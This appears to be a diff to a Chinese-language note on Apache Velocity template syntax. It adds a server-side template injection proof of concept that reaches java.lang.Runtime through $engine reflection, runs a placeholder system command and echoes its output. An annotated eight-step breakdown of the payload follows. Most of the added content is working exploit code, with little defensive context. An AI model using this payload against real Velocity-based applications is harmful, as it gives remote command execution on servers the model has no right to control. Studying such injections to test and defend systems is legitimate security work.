@@ -24,3 +24,61 @@ $表示符
 　　 如：在html标签中显示java对象msg的值。
      2、#if($!obj) #else #end 判断语句
 　　 如：在EasyJWeb各种开源应用中，我们经常看到的用于弹出提示信息msg的例子。
+
+
+
+```POC
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+#set($runtime=$run.getRuntime())
+#set($proc=$runtime.exec("COMMAND"))
+#set($null=$proc.waitFor())
+#set($istr=$proc.getInputStream())
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($output="")
+#set($string=$engine.getClass().forName("java.lang.String"))
+#foreach($i in [1..$istr.available()])
+#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+$output
+```
+流程分解
+#1：获取Runtime类访问权
+```velocity
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+```
+#2：创建Runtime实例
+```velocity
+#set($runtime=$run.getRuntime())
+```
+#3：执行系统命令
+```velocity
+#set($proc=$runtime.exec("COMMAND"))
+```
+#4：同步等待执行完成
+```velocity
+#set($null=$proc.waitFor())
+```
+#5：建立输出捕获通道
+```velocity
+#set($istr=$proc.getInputStream())
+```
+
+#6：准备字符编码处理
+```velocity
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($string=$engine.getClass().forName("java.lang.String"))
+```
+  - Character：字节到字符转换
+  - String：字符串拼接操作
+
+#7：循环读取命令输出
+```velocity
+#set($output="")
+#foreach($i in [1..$istr.available()])
+#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+```
+#8：回显攻击结果
+```velocity
+$output
+```
